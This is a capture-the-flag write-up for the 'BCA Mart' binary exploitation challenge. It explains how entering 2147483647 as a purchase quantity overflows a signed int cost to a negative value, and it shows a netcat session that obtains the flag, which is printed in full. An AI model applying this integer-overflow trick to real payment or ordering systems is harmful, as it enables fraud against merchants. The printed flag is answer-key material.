# BCA Mart
**Category :** binex

# Description
After the pandemic hit, everybody closed up shop and moved online. Not wanting to be left behind, BCA MART is launching its own digital presence. Shop BCA MART from the comfort of your own home today!

# Solution
A source file, binary file and a netcat host:port were given.

```
$ file bca-mart
bca-mart: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc848e79181e575b4c63ed0596fee4d52e3cdfd, for GNU/Linux 3.2.0, not stripped
```

We can see that file is a 64bit ELF binary.

My analysis on the source code.
* From looking at the source code we can see that money is a fixed value 15.
* There were to scanfs in the code, so 2 inputs.
* 1st scanf - definitely, we need to send 6 in here for the flag.
* 2nd scanf - we need to send the amount of flags in here, any number of our wish.
```
...
  3
  4 int money = 15;
...
  8     printf("How many %s would you like to buy?\n", item);
  9     printf("> ");
 10     scanf("%d", &amount);
...
 53         puts("What would you like to buy?");
 54
 55         printf("> ");
 56         scanf("%d", &input);
...
```

**Max length of int (4bytes) is -2,147,483,648 to 2,147,483,647.**

So if we send the amount as 2147483647, cost variable will overflow to negative since cost *= amount and cost is an int. Then cost will become negative and will be less than the money value. As we are returning the amount value in amount 2147483647 will still be positive. So purchase returns greater than zero success.

```
$ nc bin.bcactf.com 49153
Welcome to BCA MART!
We have tons of snacks available for purchase.
(Please ignore the fact we charge a markup on everything)

1) Hichew™: $2.00
2) Lays® Potato Chips: $2.00
3) Water in a Bottle: $1.00
4) Not Water© in a Bottle: $2.00
5) BCA© school merch: $20.00
6) Flag: $100.00
0) Leave

You currently have $15.
What would you like to buy?
> 6
How many super-cool ctf flags would you like to buy?
> 2147483647
That'll cost $-100.
Thanks for your purchse!
bcactf{bca_store??_wdym_ive_never_heard_of_that_one_before}


1) Hichew™: $2.00
2) Lays® Potato Chips: $2.00
3) Water in a Bottle: $1.00
4) Not Water© in a Bottle: $2.00
5) BCA© school merch: $20.00
6) Flag: $100.00
0) Leave

You currently have $115.
What would you like to buy?
> ^C
```

## Flag
bcactf{bca_store??_wdym_ive_never_heard_of_that_one_before}
